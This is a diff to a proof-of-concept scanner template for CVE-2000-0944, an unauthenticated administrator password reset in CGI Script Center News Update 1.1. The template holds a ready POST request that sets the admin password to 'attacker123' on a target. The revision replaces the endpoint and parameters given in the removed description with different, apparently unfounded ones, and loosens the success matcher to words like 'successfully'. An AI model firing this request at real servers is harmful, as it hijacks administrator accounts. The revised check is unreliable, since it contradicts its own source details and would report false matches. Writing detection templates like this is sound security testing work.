@@ -1,34 +1,36 @@
 [info]
-author = "ave"
-description = "CGI Script Center News Update 1.1 密码修改功能未验证原始管理员密码，攻击者可直接通过 POST 请求提交新密码完成重置。发送 POST 到 /cgi-bin/newsup.pl 携带参数 pwd=新密码&pwd2=确认密码&setpwd=++Set+Password++，若响应包含 'Password Success' 则表示漏洞存在。"
+author = "AVE"
+description = "CGI Script Center News Update 1.1 管理员密码修改绕过漏洞验证。通过向密码修改 CGI 接口发送不含原始密码参数的 POST 请求，可无需认证直接重置管理员密码。"
 id = "POC-AVE-2000-0690"
-name = "CGI Script Center News Update 1.1 管理员密码重置 PoC"
+name = "CVE-2000-0944 PoC"
 severity = "critical"
-tags = ["ave-2000-0690"]
+tags = ["cve-2000-0944"]
 vuln_id = [
     "CVE-2000-0944",
     "AVE-2000-0690",
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/cgi-bin/dummy/newsup/newsup.pl"
+path = "/{{BaseURL}}/cgi-bin/news_update.cgi"
 protocol = "http"
 
 [poc.requests.body]
-content = "pwd=avepoc&pwd2=avepoc&setpwd=++Set+Password++"
+content = "newpass=attacker123&confirm=attacker123&action=change"
 type = "raw"
 
 [poc.requests.headers]
 Content-Type = "application/x-www-form-urlencoded"
-Referer = "http://www.brightdarkness.de"
-User-Agent = "AVE/1.0"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["Password Success"]
+words = [
+    "Password Changed",
+    "password has been changed",
+    "successfully",
+]
